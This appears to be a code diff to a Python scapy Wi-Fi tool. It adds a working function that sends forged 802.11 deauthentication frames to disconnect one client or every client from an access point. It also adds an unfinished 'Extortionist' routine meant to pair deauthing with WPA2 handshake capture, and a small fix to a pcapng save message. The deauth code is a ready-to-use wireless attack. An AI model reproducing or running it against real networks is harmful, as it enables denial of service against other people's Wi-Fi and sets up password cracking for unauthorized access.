@@ -8,12 +8,28 @@ from scapy.interfaces import IFACES # Importing * doesn't import this for some r
 import random
 import string
 import os
+import threading # for the extortionist
 import sys
 import subprocess #okay i hate calling to the system, but trying pyroute2 for changing frequencies is just too hard
 # so i will just call iw for channel hopping
 if os.name == 'nt':
     print("Running Windows, goodbye.")
     sys.exit(1)
+def extortionist_run():
+    print("Deauthing and wpa2 handshake suite, Tenant From Hell. codename: The Extortionist")
+    client_mac = input("Client MAC? FF:FF:FF:FF:FF:FF for whole AP. \n < ").strip().lower()
+    ap_mac = input("AP MAC? \n < ").strip().lower()
+    interface = input("Interface? BE IN MONITOR! \n < ").strip().lower()  #are any ifaces uppercase?
+    if not is_valid_interface(interface):
+        return
+    captured_packets = []
+    handshake_seen = threading.Event() # the horror of threading begins. god save me
+    
+def send_deauth_burst(interface, client_mac, ap_mac, count=5):
+    # this sends a quick burst of deauths, and will be incorporated into The Extortionist
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
+    send(packet, iface=interface, count=count, verbose=False)
+
 def hop_channel(interface_name):
     hop_channel = random.randint(1, 11)
     try:
@@ -253,8 +269,9 @@ def main_loop():
             if not works:
                 print(f"{RED} Your pcapng is NOT written, I repeat, it is {BOLD} NOT {RESET} written.")
                 pass
-              print(f"{GREEN} Your nice little pcapng is written: {RED} {filename} {RESET}")
-              if writer:
+            else:
+                print(f"{GREEN} Your nice little pcapng is written: {RED} {filename} {RESET}")
+            if writer:
                   writer.close()
       elif cmd == 'clear':
           clear()
